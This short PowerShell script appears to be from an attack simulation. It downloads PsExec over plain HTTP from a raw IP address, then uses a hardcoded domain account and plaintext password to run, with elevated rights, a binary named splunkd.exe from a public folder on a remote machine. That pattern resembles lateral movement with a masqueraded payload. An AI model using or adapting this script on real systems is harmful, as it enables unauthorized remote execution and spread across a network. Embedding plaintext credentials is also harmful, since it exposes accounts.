# Define URLs and file paths
$psExecUrl = "http://198.18.128.188:8000/PsExec.exe"  # URL where psexec.exe is hosted
$localPsExecPath = "C:\Users\Gradya\Downloads\PsExec.exe"  # Path to store psexec.exe locally
$remoteMachine = "10.4.1.25"  # Remote machine IP or hostname
$sharedSplunkdPath = "c:\Users\Public\test\splunkd.exe"  # Path to splunkd.exe in the shared folder
$domainUser = "hquser001\mspadmin"  # Replace with the domain user
$password = "C1sco12345!"  # Replace with the password for the domain user

# Step 1: Download PsExec from the HTTP server to Grady's laptop
Invoke-WebRequest -Uri $psExecUrl -OutFile $localPsExecPath

# Step 2: Use PsExec to run splunkd.exe from the shared folder on the remote machine (10.4.1.25)
$arguments = "-accepteula \\$remoteMachine -u $domainUser -p $password -h $sharedSplunkdPath"
Start-Process -FilePath $localPsExecPath -ArgumentList $arguments -NoNewWindow -Wait
